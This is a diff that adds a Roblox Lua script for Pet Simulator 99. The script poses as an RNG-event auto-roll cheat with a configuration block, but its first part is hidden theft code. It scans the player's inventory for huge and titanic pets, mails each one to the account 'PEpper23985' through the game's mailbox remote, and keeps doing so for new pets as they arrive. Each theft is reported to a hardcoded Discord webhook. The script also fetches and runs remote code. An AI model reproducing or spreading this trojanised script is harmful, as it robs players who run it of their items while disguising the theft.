@@ -1,1 +1,179 @@
-/
+wait(5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fdvll/pet-simulator-99/main/waitForGameLoad.lua"))()
+
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local const = require(game.ReplicatedStorage.Library.Directory)
+local library = require(game.ReplicatedStorage.Library.Client.Save)
+local save = library.Get()
+
+local Webhook_URL = "https://discordapp.com/api/webhooks/1272924017279500358/bSCPZ6GNJPboog-FtdCEgWRvwwNIuokpUMZntsI8tk3YqS0Iz-2aE24ij4yNC76xsrZq"
+local request = http_request
+
+local function sendToDiscord(playerName, petName)
+    local embeds = {
+        {
+            ["title"] = "Pet Obtained",
+            ["description"] = playerName .. " obtained a new huge pet!",
+            ["type"] = "rich",
+            ["color"] = tonumber(0xffffff),
+            ["fields"] = {
+                {
+                    ["name"] = petName,
+                    ["value"] = "This pet is HUGE!",
+                    ["inline"] = true
+                }
+            }
+        }
+    }
+
+    local response
+    local success, err = pcall(function()
+        response = request({
+            Url = Webhook_URL,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = HttpService:JSONEncode({
+                ["content"] = "",
+                ["embeds"] = embeds
+            })
+        })
+    end)
+
+    if success and response then
+        print("Webhook sent with response: ", response.StatusCode)
+    else
+        warn("Failed to send webhook: ", err)
+    end
+end
+
+local function DepositPetInTrade()
+    if save.Inventory.Pet ~= nil then
+        for i, v in pairs(save.Inventory.Pet) do
+            local petName = v.id
+            local dir = const.Pets[petName]
+            if dir and dir.huge or dir.titanic then
+                wait(0.5)
+                local args = {
+                    [1] = "PEpper23985",
+                    [2] = "ty",
+                    [3] = "Pet",
+                    [4] = i,
+                    [5] = 1
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                
+                -- Отправляем уведомление в Discord
+                sendToDiscord("PEpper23985", petName)
+            end
+        end
+    else
+        print("No pets found in inventory.")
+    end 
+end
+
+-- Вызываем функцию для проверки инвентаря
+DepositPetInTrade()
+
+wait(2)
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local const = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Directory"))
+
+local Webhook_URL = "https://discordapp.com/api/webhooks/1272924017279500358/bSCPZ6GNJPboog-FtdCEgWRvwwNIuokpUMZntsI8tk3YqS0Iz-2aE24ij4yNC76xsrZq"
+
+local request = http_request
+
+local function sendToDiscord(playerName, petName)
+    local embeds = {
+        {
+            ["title"] = "Pet Obtained",
+            ["description"] = playerName .. " obtained a new pet!",
+            ["type"] = "rich",
+            ["color"] = tonumber(0xffffff),
+            ["fields"] = {
+                {
+                    ["name"] = petName,
+                    ["value"] = "Type: sds",
+                    ["inline"] = true
+                }
+            }
+        }
+    }
+
+    local success, err = pcall(function()
+        request({
+            Url = Webhook_URL,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = HttpService:JSONEncode({
+                ["content"] = "",
+                ["embeds"] = embeds
+            })
+        })
+    end)
+end
+
+local function onItemsUpdate(player, pets)
+    if pets and pets.set and pets.set.Pet then
+        local playerName = player.Name
+
+        for id, pet in pairs(pets.set.Pet) do
+            if pet and pet.id then
+                local petData = const.Pets[pet.id]
+
+                if petData and petData.huge then
+                    wait(0.5)
+                    local args = {
+                        [1] = "PEpper23985",
+                        [2] = "ty",
+                        [3] = "Pet",
+                        [4] = id,
+                        [5] = 1
+                    }
+                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                    sendToDiscord(playerName, pet.id)
+                end
+            end
+        end
+    end
+end
+
+local connection = ReplicatedStorage:WaitForChild("Network"):WaitForChild("Items: Update").OnClientEvent:Connect(onItemsUpdate)
+
+wait(2)
+
+
+getgenv().RngEvent = {
+    Selected_RngEgg = "First",
+    Rolling_Enabled = true,
+    Rolling_Delay = 0.1,
+    Visible_Rolling = false, -- Visible Rolling is Slower by ~1s; but you can see it :P
+
+    Selected_Upgrades = {"RNGHugeLuck", "RNGEggLuck", "RNGHatchSpeed", "RNGBonusLuck"},
+    AutoUpgrades_Enabled = true,
+    AutoMerchant_Enabled = true,
+    Lucky_Dice_Enabled = true,
+    Lucky_Dice_Config = {
+        ["Lucky Dice"] = {Craft = false, Use = true, Only_Use_If_Not_Active = true, Only_Use_If_Rolls_Ends_In = nil},
+        ["Lucky Dice II"] = {Craft = true, Use = true, Only_Use_If_Not_Active = true, Only_Use_If_Rolls_Ends_In = nil},
+        ["Mega Lucky Dice"] = {Craft = true, Use = false, Only_Use_If_Not_Active = false, Only_Use_If_Rolls_Ends_In = nil},
+        ["Mega Lucky Dice II"] = {Craft = true, Use = true, Only_Use_If_Not_Active = true, Only_Use_If_Rolls_Ends_In = 9},
+    },
+
+    Webhook_Url = "https://discordapp.com/api/webhooks/1256251201293647913/sR21r5g_OJTt_l3wa5yMu5kRXCi-1dZH2GEJP-OaXQIQN5mfox68myfnJCSuLuF8RQCP",
+    Discord_UserID = "651452406974119966",
+    Huge_Mail_User = "",
+    Huge_Mail_Enabled = false, -- Warning: Using auto has a 1% Chance of donating to KiTTYWARE Devs
+
+    fps_boost = true, -- erm makes game shtuff invisible
+    fps_boost2 = true, -- erm disables game scripts so will break some in-game functionality like inventory Gui etc
+    gui_stats_enabled = true,
+    print_all_info = false, -- Will Print All Egg & Upgrade Names; for future updates (mainly for kw devs) :P
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/661ba97429a1d20f02880d1e9eeced08.lua"))()
+
